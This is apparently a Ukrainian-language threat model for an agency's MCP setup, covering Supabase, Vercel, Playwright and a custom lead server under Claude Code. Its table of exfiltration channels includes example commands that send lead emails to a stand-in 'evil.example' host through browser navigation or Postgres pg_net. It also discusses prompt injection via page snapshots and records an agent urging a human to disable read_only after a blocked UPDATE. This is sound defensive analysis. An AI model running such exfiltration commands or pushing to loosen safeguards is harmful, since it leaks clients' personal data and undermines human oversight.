# Threat model: MCP-інтеграції LeadDesk (Task D)

Спирається на `.mcp.json`, `.claude/settings.json`, `mcp/leaddesk-server/src/server.mjs` і на те, що
агенти справді робили в Task B–C (`docs/mcp/verification.md`, `docs/mcp/ab/`).

**Правило без винятків:** клієнтський проєкт до агента напряму не підключаємо. Працюємо з окремого
акаунта без клієнтських організацій і команд; дані клієнта потрапляють туди лише як копія чи
синтетика.

## Які дані бачить агент

| Сервер | Що потрапляє в контекст агента | Чиї це дані | Чи є там текст, який написали треті особи |
|---|---|---|---|
| `supabase` | Уся таблиця `public.leads` через `execute_sql`: `full_name`, `email`, `company`, `source`, `budget`, `message`, `created_at`; схема (`list_tables` verbose показує всі колонки); метадані проєкту, URL і publishable-ключі (`development`). В A/B агент сам прочитав `message` ліда, хоча для відповіді він не був потрібен | клієнта: персональні дані людей, які заповнили форму на сайті клієнта (тут синтетичні) | **так** — `message` і `full_name`/`company` пишуть відвідувачі форми. Supabase загортає результат у `<untrusted-data-…>`, але вендор сам пише, що це не гарантія |
| `vercel` | Проєкти, деплої, лог білду (коміти, назви пакетів, маршрути), `list_teams` (назви команд); інструментами з 244 доступні й runtime-логи, змінні середовища проєкту, коментарі toolbar | наші й клієнта (код і інфраструктура проєкту); runtime-логи містять дані кінцевих користувачів | **так** — runtime-логи (вхід користувачів, заголовки), коментарі toolbar від рев'юерів клієнта, повідомлення комітів |
| `playwright` | Знімок доступності сторінки, скриншоти, консоль, мережеві запити (`browser_network_request` — заголовки й тіло, зокрема `Cookie`) сторінок, які відкриває агент; усе, що він вводить у форми | наші (застосунок на `localhost:3000`) і будь-чиї — з будь-якої сторінки, куди браузер дійде | **так** — кожен знімок сторінки — недовірений текст; на `/dashboard` — тексти заявок лідів |
| `leaddesk` | Лише `id`, `company`, `status`, `source`, `budget`, `createdAt` (`publicLead`, `server.mjs:25`); ресурс зі статусами; записи аудиту (`from`, `to`, `reason`). Без `fullName`, `email`, `message` | клієнта (ліди), але мінімальний зріз | майже ні — лише `company`, яку вводить відвідувач форми. `reason` пишуть людина або агент |

## Канали виносу в цій же сесії

| Канал | Звідки (сервер або вбудований інструмент) | Як ним можна винести дані | Закрито? Чим саме |
|---|---|---|---|
| `browser_navigate` на адресу з даними в query / шляху | `playwright` | `navigate("https://evil.example/?d=<email лідів>")` — запит іде з браузера на чужий сервер | **Ні, частково.** `--allowed-origins http://localhost:3000` (`.mcp.json:14`) — за словами вендора не межа безпеки й на редиректи не діє. Гірше: `browser_navigate` в `allow` (`settings.json:28`), тож апруву не буде. Захищає лише окрема сесія без Supabase |
| Форма на сторінці (`browser_fill_form` + `browser_click`) | `playwright` | ввести дані в будь-яку форму, яка відправляє їх на інший домен (або сторінка сама надсилає введене) | **Ні, частково** — те саме `--allowed-origins`; обидва інструменти в `allow` (`settings.json:31`, `:33`) |
| `deploy_to_vercel` з `target: preview` | `vercel` | задеплоїти код/файл із даними на публічний `*.vercel.app` | **Так** — deny `settings.json:8` |
| `get_access_to_vercel_url` | `vercel` | роздати посилання на деплой в обхід Deployment Protection | **Так** — deny `settings.json:9` |
| Коментарі toolbar (`reply_to_toolbar_thread`, `edit_toolbar_message`) | `vercel` | написати дані в листування, яке бачить клієнт і його рев'юери | **Так** — deny `settings.json:11–14` |
| `use_vercel_cli` → `Bash` → `vercel env`, `vercel deploy` | `vercel` + вбудований `Bash` | модель отримує інструкцію й виконує локальний CLI під CLI-токеном | **Так, на цій машині** — Vercel CLI не встановлено (`vercel: command not found`). Жодне правило `mcp__vercel__*` цього не закриває |
| `Bash` (`curl`, `node -e fetch`, `git push`) | вбудований інструмент Claude Code | надіслати будь-що будь-куди; прочитати `.env.local` | **Ні** — лише запит дозволу в manual mode. В auto mode класифікатор сам схвалив Bash-команду (Task B, Supabase) |
| `WebFetch` | вбудований інструмент Claude Code | GET на чужий URL з даними в query | **Ні** — лише запит дозволу на домен |
| `execute_sql` → `pg_net` / `http` extension | `supabase` (профіль «build», без `read_only`) | `create extension pg_net; select net.http_post('https://evil…', …)` — запит із самої бази, не з машини | **Частково** — `execute_sql` / `apply_migration` не в `allow`, кожен виклик людина читає вручну; `read_only=true` у профілі «client» блокував би запис і створення extension |

## Що ми забороняємо і чим саме

| Що заборонено | Механізм: deny, URL, прапорець, окремий акаунт, окрема сесія | Де це видно: файл і рядок | Чого цей механізм НЕ закриває |
|---|---|---|---|
| Інші проєкти й account-інструменти Supabase | URL: `project_ref=…` + `features` без `account` | `.mcp.json:5` | OAuth-токен видано на всю організацію (read+write: Database, Functions, Projects, Storage; read: Secrets). Вкрадений токен із іншим URL бачить усе |
| Edge Functions, branching, storage Supabase | URL: `features=database,development,docs` | `.mcp.json:5` | `execute_sql` лишається: довільний SQL, читання всіх рядків під роллю `postgres` (власник таблиці — RLS його не обмежує) |
| Запис у Supabase на читальних задачах (A/B) | URL: `read_only=true&features=database,docs` (профіль «client», Task C) | команда в `docs/mcp/ab-generic-vs-domain.md` | Не прибирає `execute_sql` і читання: агент читав `message`; не завадив **спробі** `UPDATE` — її зупинила база, а агент двічі порадив людині вимкнути `read_only` |
| Автоматичний `execute_sql` / `apply_migration` | їх немає в `allow` → manual-апрув кожного виклику | `.claude/settings.json:22–24` (в `allow` лише `search_docs`, `list_tables`, `list_migrations`) | Апрув — сирий SQL: його треба прочитати. Auto mode і «Yes, and don't ask again» знімають і цей бар'єр |
| 11 інструментів Vercel, що змінюють стан (покупки, деплой, посилання в обхід захисту, toolbar) | deny точними іменами | `.claude/settings.json:4–14` | Токен Vercel — весь користувач (OAuth `openid`); deny діє лише в Claude Code з цим файлом; `use_vercel_cli` → `Bash` (закрито тим, що CLI не встановлено) |
| `browser_run_code_unsafe`, `browser_file_upload`, `browser_drop`, `browser_evaluate` | deny | `.claude/settings.json:15`, `:17–19` | `browser_navigate` / форма як канал виносу; `Bash` однаково може прочитати `.env.local`; знімки сторінок — недовірений текст у контексті |
| Інструменти, які додає сторінка (`webmcp_*`) | прапорець `--no-webmcp` + deny `webmcp_*` | `.mcp.json:14`, `.claude/settings.json:16` | Інструкції в тексті самої сторінки (prompt injection у знімку) |
| Логіни й cookies з наших браузерів | `--isolated` (профіль лише в пам'яті); жодних `--extension`, `--cdp-endpoint`, `--user-data-dir` | `.mcp.json:14` | Те, що агент сам введе під час сесії |
| Чужі адреси в браузері | `--allowed-origins http://localhost:3000` | `.mcp.json:14` | Вендор: не межа безпеки, на редиректи не діє |
| Автооновлення серверів | точні версії: `@playwright/mcp@0.0.82`, `@modelcontextprotocol/server 2.1.0`, `zod 4.6.5`; жодного `@latest` | `.mcp.json:14`, `mcp/leaddesk-server/package.json` | Віддалені `mcp.supabase.com` і `mcp.vercel.com` змінюються на боці вендора без нас |
| Браузер разом із Supabase; більше одного сервера з записом в одній сесії | окремі сесії, перемикачі в `/mcp`; конектори claude.ai вимкнено | `AGENTS.md` (розділ «MCP-сервери»), `docs/mcp/connections.md` (розділ «Сесії») | Конфіг цього не забезпечує: `.mcp.json` закомічено, і `claude -p` у теці підніме **всі** його сервери разом без питань |
| Зайві поля лідів (`fullName`, `email`, `message`) у доменному сервері | код сервера: `publicLead` віддає 6 полів | `mcp/leaddesk-server/src/server.mjs:25` | Агента в тій самій сесії з Supabase — там усі поля доступні через `execute_sql` |
| Довільний статус і зміна без сліду | `z.enum` на 5 статусів, запис аудиту на кожну зміну, `set_lead_status` не в `allow` | `mcp/leaddesk-server/src/server.mjs:77–107` (enum `:85`, `isError` `:92–97`, аудит `:100–101`) | Аудит лише в пам'яті процесу (зникає після перезапуску); `reason` модель може сформулювати сама (A/B, запит 5) |
| Клієнтські організації й команди | окремі особисті акаунти Supabase і Vercel; GitHub App Vercel — лише на один репозиторій | `docs/mcp/connections.md` (рядок «Акаунти») | Помилку людини на екрані згоди OAuth (вибір не тієї організації) |

## Що пишемо в договір

- **Які системи клієнта підключаємо і з якими правами:** база Supabase одного проєкту (на період
  розробки — читання й запис схеми та даних; на читальних задачах — `read_only`), Vercel — лише
  перегляд деплоїв і логів білду, браузер — лише локальна копія застосунку. Продакшн-базу клієнта й
  живі дані до агента не підключаємо.
- **Чиї акаунти:** клієнтський проєкт до агента напряму не підключаємо; працюємо з окремих акаунтів
  без клієнтських організацій і команд. Власник акаунтів — агенція (виконавець); клієнт надає копію
  або синтетичні дані, доступи відкликаються після завершення робіт (`claude mcp remove` видаляє й
  OAuth-токени).
- **Куди їдуть дані клієнта:** усе, що агент прочитав (рядки бази, логи, знімки сторінок), потрапляє в
  контекст моделі, тобто до провайдера LLM (Anthropic), а також до вендорів MCP-серверів (Supabase,
  Vercel), через які йдуть запити.
- **Supabase MCP працює з правами розробника** (роль `postgres`, власник таблиць, RLS її не
  обмежує) — він для розробки, клієнтам і кінцевим користувачам його не віддаємо.
- **Зміни даних агентом** — лише через доменні інструменти з апрувом людини й записом в аудит
  (`leaddesk_set_lead_status`); прямий SQL на зміну даних — лише після прочитання людиною.
- **Персональні дані відвідувачів форми** (`full_name`, `email`, `message`) агенту для щоденних задач
  не відкриваємо: доменний сервер віддає лише 6 полів.
- **Figma** не використовували; якщо підключатимемо — на планах Starter і Professional content
  training за замовчуванням увімкнено, це треба погодити з клієнтом або вимкнути.
